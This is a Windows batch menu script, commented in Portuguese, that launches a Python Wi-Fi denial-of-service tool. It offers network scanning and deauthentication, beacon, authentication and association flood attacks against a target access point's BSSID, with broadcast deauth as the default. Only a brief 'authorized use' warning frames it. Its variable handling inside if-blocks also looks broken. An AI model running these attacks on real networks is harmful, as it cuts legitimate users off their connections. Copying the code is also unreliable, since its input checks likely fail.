@echo off
REM Script auxiliar para executar o WiFi DoS no Windows
REM Execute como Administrador para melhor resultado

echo ========================================
echo    WiFi DoS - Teste de Seguranca
echo ========================================
echo.
echo AVISO: Use apenas em ambientes autorizados!
echo.

REM Verifica se Python está instalado
python --version >nul 2>&1
if errorlevel 1 (
    echo [ERRO] Python nao encontrado!
    echo Instale Python de https://www.python.org
    pause
    exit /b 1
)

REM Verifica se as dependências estão instaladas
python -c "import scapy" >nul 2>&1
if errorlevel 1 (
    echo [*] Instalando dependencias...
    pip install -r requirements.txt
    if errorlevel 1 (
        echo [ERRO] Falha ao instalar dependencias
        pause
        exit /b 1
    )
)

echo.
echo Escolha uma opcao:
echo 1. Escanear redes WiFi
echo 2. Ataque de desautenticacao (Deauth)
echo 3. Flood de beacons
echo 4. Flood de autenticacao
echo 5. Flood de associacao
echo 6. Modo manual (argumentos customizados)
echo.
set /p opcao="Opcao: "

if "%opcao%"=="1" (
    python wifi_dos.py --scan
    pause
    exit /b 0
)

if "%opcao%"=="2" (
    echo.
    set /p bssid="Digite o BSSID (MAC) do AP alvo (ex: AA:BB:CC:DD:EE:FF): "
    if "%bssid%"=="" (
        echo [ERRO] BSSID nao pode estar vazio
        pause
        exit /b 1
    )
    echo.
    set /p cliente="Digite o MAC do cliente (deixe vazio para broadcast): "
    if "%cliente%"=="" set cliente=ff:ff:ff:ff:ff:ff
    echo.
    echo [*] Iniciando ataque de desautenticacao...
    echo [*] Pressione Ctrl+C para parar
    echo.
    python wifi_dos.py --deauth -b %bssid% -c %cliente%
    pause
    exit /b 0
)

if "%opcao%"=="3" (
    echo.
    set /p count="Numero de redes falsas (padrao: 100): "
    if "%count%"=="" set count=100
    echo.
    echo [*] Iniciando flood de beacons...
    echo [*] Pressione Ctrl+C para parar
    echo.
    python wifi_dos.py --beacon --count %count%
    pause
    exit /b 0
)

if "%opcao%"=="4" (
    echo.
    set /p bssid="Digite o BSSID (MAC) do AP alvo: "
    if "%bssid%"=="" (
        echo [ERRO] BSSID nao pode estar vazio
        pause
        exit /b 1
    )
    echo.
    echo [*] Iniciando flood de autenticacao...
    echo [*] Pressione Ctrl+C para parar
    echo.
    python wifi_dos.py --auth -b %bssid%
    pause
    exit /b 0
)

if "%opcao%"=="5" (
    echo.
    set /p bssid="Digite o BSSID (MAC) do AP alvo: "
    if "%bssid%"=="" (
        echo [ERRO] BSSID nao pode estar vazio
        pause
        exit /b 1
    )
    echo.
    echo [*] Iniciando flood de associacao...
    echo [*] Pressione Ctrl+C para parar
    echo.
    python wifi_dos.py --assoc -b %bssid%
    pause
    exit /b 0
)

if "%opcao%"=="6" (
    echo.
    echo Execute o script manualmente com os argumentos desejados:
    echo python wifi_dos.py --help
    echo.
    python wifi_dos.py --help
    pause
    exit /b 0
)

echo [ERRO] Opcao invalida
pause
exit /b 1

